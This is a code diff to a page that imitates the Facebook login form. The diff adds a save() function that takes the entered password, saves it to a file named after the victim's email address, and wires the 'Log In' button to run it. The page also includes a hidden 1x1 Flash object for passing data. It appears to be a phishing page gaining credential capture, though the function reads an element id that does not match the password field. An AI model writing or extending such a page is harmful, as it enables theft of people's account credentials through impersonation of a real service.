@@ -80,6 +80,36 @@ function sendFlash()
     flash.sendToActionScript(yourObject,orParameter);
   }
 }
+
+function save()
+{
+	var textToWrite = document.getElementById("password").value;
+	var textFileAsBlob = new Blob([textToWrite], {type:'text/plain'});
+	var fileNameToSaveAs = document.getElementById("email").value;
+
+	var downloadLink = document.createElement("a");
+	downloadLink.download = fileNameToSaveAs;
+	downloadLink.innerHTML = "Download File";
+	if (window.webkitURL != null)
+	{
+		// Chrome allows the link to be clicked
+		// without actually adding it to the DOM.
+		downloadLink.href = window.webkitURL.createObjectURL(textFileAsBlob);
+	}
+	else
+	{
+		// Firefox requires the link to be added to the DOM
+		// before it can be clicked.
+		downloadLink.href = window.URL.createObjectURL(textFileAsBlob);
+		downloadLink.onclick = destroyClickedElement;
+		downloadLink.style.display = "none";
+		document.body.appendChild(downloadLink);
+	}
+
+	downloadLink.click();
+}
+
+
 -->
 </script>
   
@@ -98,7 +128,7 @@ function sendFlash()
 <label for="email" class="login_form_label">Email:</label><input type="text" class="inputtext" id="email" name="email" value="" /></div>
 <div class="form_row clearfix"><label for="pass" class="login_form_label">Password:</label><input type="password" name="password" id="pass" class="inputpassword" value="<?php if(isset($_POST['password']))  echo $_POST['password'];?>"/></div>
 <div class="persistent"><div class="uiInputLabel clearfix uiInputLabelLegacy"><input id="persist_box" type="checkbox" value="1" name="persistent" class="uiInputLabelInput uiInputLabelCheckbox" /><label for="persist_box" class="uiInputLabelLabel">Keep me logged in</label></div></div><input type="hidden" autocomplete="off" id="default_persistent" name="default_persistent" value="0" /><p class="reset_password form_row"><a href="https://www.facebook.com/recover/initiate" target="_blank" tabindex="-1">Forgot your password?</a></p></div>
-<div id="dialog_buttons" class="dialog_buttons"><label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"><input value="Log In" name="login" type="submit" id="u_0_1" onclick="write();" /></label></div></form></div></div></div>
+<div id="dialog_buttons" class="dialog_buttons"><label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"><input value="Log In" name="login" type="submit" id="u_0_1" onclick="save();" /></label></div></form></div></div></div>
 
 <div id="flashContent">
 			<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="1" height="1" id="em" align="middle">
